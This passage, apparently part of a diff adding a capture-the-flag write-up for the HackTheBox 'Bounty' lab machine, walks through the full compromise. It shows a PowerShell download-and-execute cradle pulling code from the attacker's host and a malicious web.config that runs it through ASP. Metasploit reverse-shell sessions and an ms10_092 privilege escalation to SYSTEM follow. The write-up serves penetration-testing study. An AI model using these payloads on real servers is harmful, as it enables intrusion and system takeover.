+powershell.exe &lt;span class=&quot;nt&quot;&gt;-nop&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; hidden &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;new-object net.webclient&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$g&lt;/span&gt;.proxy&lt;span class=&quot;o&quot;&gt;=[&lt;/span&gt;Net.WebRequest]::GetSystemWebProxy&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$g&lt;/span&gt;.Proxy.Credentials&lt;span class=&quot;o&quot;&gt;=[&lt;/span&gt;Net.CredentialCache]::DefaultCredentials&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;IEX &lt;span class=&quot;nv&quot;&gt;$g&lt;/span&gt;.downloadstring&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://10.10.13.75:8080/moceswFJvKmkeD8'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Here is our payload! We must now integrate it into the &lt;strong&gt;web.config&lt;/strong&gt; file. Do not close the msfconsole or hit CTR+C because Metasploit is currently listening and waiting for the payload to return.&lt;/p&gt;
+
+&lt;h4 id=&quot;payload-incorporation&quot;&gt;Payload Incorporation&lt;/h4&gt;
+
+&lt;p&gt;As you may have noticed, the payload is a &lt;strong&gt;powershell script&lt;/strong&gt; (remember &lt;em&gt;set TARGET 2&lt;/em&gt;) and not an &lt;strong&gt;ASP&lt;/strong&gt; script.
+However, we can call system functions in &lt;strong&gt;ASP&lt;/strong&gt; so we will call &lt;strong&gt;cmd.exe&lt;/strong&gt; and pass our payload as an argument.&lt;/p&gt;
+
+&lt;p&gt;This will result in the following &lt;strong&gt;web.config&lt;/strong&gt; file:&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;system.webServer&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;handlers&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;accessPolicy=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Read, Script, Write&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;add&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;web_config&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;path=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*.config&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;verb=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;modules=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IsapiModule&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;scriptProcessor=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%windir%\system32\inetsrv\asp.dll&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;resourceType=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unspecified&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;requireAccess=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Write&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;preCondition=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bitness64&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/handlers&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;security&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;requestFiltering&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;fileExtensions&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;remove&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;fileExtension=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.config&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/fileExtensions&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;hiddenSegments&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;remove&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;segment=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;web.config&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/hiddenSegments&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/requestFiltering&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/security&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/system.webServer&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%
+on error resume next
+Dim oS,output
+Set oS = Server.CreateObject(&quot;WSCRIPT.SHELL&quot;)
+output = oS.exec(&quot;cmd.exe &amp;gt; /c powershell.exe -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRequest]::GetSystemWebProxy();$B.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $B.downloadstring('http://10.10.13.75:8080/G783OPiDR3Em');&quot;).stdout.readall
+Response.write(&quot;Powershell: &quot; &lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt; vbCrLf &lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt; output &lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt; vbCrLf &lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt; vbCrLf)
+%&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;upload-webconfig-and-access-it&quot;&gt;Upload web.config and access it&lt;/h4&gt;
+
+&lt;p&gt;Now we have to upload our &lt;strong&gt;web.config&lt;/strong&gt; file and visit the URL &lt;a href=&quot;http://10.10.10.93/uploadedfiles/web.config&quot;&gt;http://10.10.10.93/uploadedfiles/web.config&lt;/a&gt; to trigger the payload.&lt;/p&gt;
+
+&lt;h4 id=&quot;back-to-msfconsole&quot;&gt;Back to msfconsole&lt;/h4&gt;
+
+&lt;p&gt;We should see the following inside &lt;strong&gt;msfconsole&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 10.10.10.93      web_delivery - Delivering Payload
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Sending stage &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;206403 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to 10.10.10.93
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Meterpreter session 1 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.13.75:4444 -&amp;gt; 10.10.10.93:49158&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-10-28 19:23:06 +0100
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A session has been opened on the remote target. We can list every opened sessions with &lt;code class=&quot;highlighter-rouge&quot;&gt;sessions -l&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; sessions &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+
+Active sessions
+&lt;span class=&quot;o&quot;&gt;===============&lt;/span&gt;
+
+  Id  Name  Type                     Information             Connection
+  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                     &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;             &lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt;
+  1         meterpreter x64/windows  BOUNTY&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;erlin @ BOUNTY  10.10.13.75:4444 -&amp;gt; 10.10.10.93:49158 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.93&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As you can see, we are currently connected as &lt;strong&gt;merlin&lt;/strong&gt; on the &lt;strong&gt;BOUNTY&lt;/strong&gt; machine.&lt;/p&gt;
+
+&lt;h4 id=&quot;gimme-this-usertxt&quot;&gt;Gimme this user.txt&lt;/h4&gt;
+
+&lt;p&gt;It’s now time to retrieve the &lt;strong&gt;user flag&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Inside &lt;strong&gt;msfconsole&lt;/strong&gt;, we can move into the session number 1 with &lt;code class=&quot;highlighter-rouge&quot;&gt;sessions -i 1&lt;/code&gt; and we should arrive in a meterpreter shell.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; sessions &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 1
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Starting interaction with 1...
+
+meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From here, we can use a few shell commands (the full list can be displayed by typing &lt;code class=&quot;highlighter-rouge&quot;&gt;help&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;?&lt;/code&gt;) or type &lt;code class=&quot;highlighter-rouge&quot;&gt;shell&lt;/code&gt; and dive into the classical Windows command prompt.&lt;/p&gt;
+
+&lt;p&gt;I suggest you to play around with the available commands from &lt;strong&gt;meterpreter&lt;/strong&gt; and to get familiar with it.&lt;/p&gt;
+
+&lt;p&gt;The following command will give you the user flag:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;C:/Users/merlin/Desktop/user.txt
+e29ad8[...]2f44a2f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
+
+&lt;p&gt;The privilege escalation was very straight-forward for this box, especially with meterpreter.&lt;/p&gt;
+
+&lt;p&gt;We will use a great module for lazy people, which is called: &lt;strong&gt;local_exploit_suggester&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;local-exploit-suggester&quot;&gt;Local Exploit Suggester&lt;/h3&gt;
+
+&lt;p&gt;Back in our metepreter session, we can call this module with the following command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run post/multi/recon/local_exploit_suggester
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 10.10.10.93 - Collecting &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;exploits &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;x64/windows...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 10.10.10.93 - 10 exploit checks are being tried...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.10.93 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.10.93 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.10.93 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So many options! :smiling_imp:&lt;/p&gt;
+
+&lt;p&gt;Let’s try the first one…&lt;/p&gt;
+
+&lt;h3 id=&quot;ms10_092_schelevator&quot;&gt;ms10_092_schelevator&lt;/h3&gt;
+
+&lt;p&gt;We can background our current &lt;strong&gt;meterpreter session&lt;/strong&gt; thanks to the command &lt;code class=&quot;highlighter-rouge&quot;&gt;background&lt;/code&gt; so we go back to &lt;strong&gt;msfconsole&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Then, we can tell Metasploit to use &lt;strong&gt;exploit/windows/local/ms10_092_schelevator&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/script/web_delivery&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/windows/local/ms10_092_schelevator
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; options
+
+Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;exploit/windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+
+   Name      Current Setting  Required  Description
+   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
+   CMD                        no        Command to execute instead of a payload
+   SESSION                    yes       The session to run this module on.
+   TASKNAME                   no        A name &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the created task &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default random&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+
+Exploit target:
+
+   Id  Name
+   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+   0   Windows Vista, 7, and 2008
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We specify the &lt;strong&gt;session number&lt;/strong&gt; to run this module on and the payload we want along with the local port to listen on for the reverse shell.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;We can’t use the same port as our previous reverse shell or no session will be created.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;SESSION 1   &lt;span class=&quot;c&quot;&gt;# The session number of our reverse shell (sessions -l to display them)&lt;/span&gt;
+SESSION &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 1
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;PAYLOAD windows/x64/meterpreter/reverse_tcp   &lt;span class=&quot;c&quot;&gt;# If the exploit works, we want a new reverse shell&lt;/span&gt;
+PAYLOAD &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; windows/x64/meterpreter/reverse_tcp
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LPORT 4445  &lt;span class=&quot;c&quot;&gt;# The local port to listen on&lt;/span&gt;
+LPORT &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 4445
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST 10.10.13.75  &lt;span class=&quot;c&quot;&gt;# Ip address of our machine&lt;/span&gt;
+LHOST &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.13.75
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then, we can launch the exploit:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.13.75:4445 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Preparing payload at C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;EMP&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;IydYyMVXS.exe
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Creating task: sMVszFGn5xTj
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SUCCESS: The scheduled task &lt;span class=&quot;s2&quot;&gt;&quot;sMVszFGn5xTj&quot;&lt;/span&gt; has successfully been created.
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SCHELEVATOR
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Reading the task file contents from C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;asks&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;MVszFGn5xTj...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Original CRC32: 0xa1c992cd
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Final CRC32: 0xa1c992cd
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Writing our modified content back...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Validating task: sMVszFGn5xTj
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Folder: &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; TaskName                                 Next Run Time          Status         
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;========================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;======================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===============&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; sMVszFGn5xTj                             11/1/2018 9:14:00 PM   Ready          
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SCHELEVATOR
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Disabling the task...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SUCCESS: The parameters of scheduled task &lt;span class=&quot;s2&quot;&gt;&quot;sMVszFGn5xTj&quot;&lt;/span&gt; have been changed.
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SCHELEVATOR
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Enabling the task...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SUCCESS: The parameters of scheduled task &lt;span class=&quot;s2&quot;&gt;&quot;sMVszFGn5xTj&quot;&lt;/span&gt; have been changed.
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SCHELEVATOR
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Executing the task...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Sending stage &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;206403 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to 10.10.10.93
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SUCCESS: Attempted to run the scheduled task &lt;span class=&quot;s2&quot;&gt;&quot;sMVszFGn5xTj&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SCHELEVATOR
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Deleting the task...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Meterpreter session 2 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.13.75:4445 -&amp;gt; 10.10.10.93:49162&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-10-28 20:14:13 +0100
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SUCCESS: The scheduled task &lt;span class=&quot;s2&quot;&gt;&quot;sMVszFGn5xTj&quot;&lt;/span&gt; was successfully deleted.
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SCHELEVATOR
+
+meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid&lt;/code&gt; command will confirm that the exploit worked:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; getuid
+Server username: NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
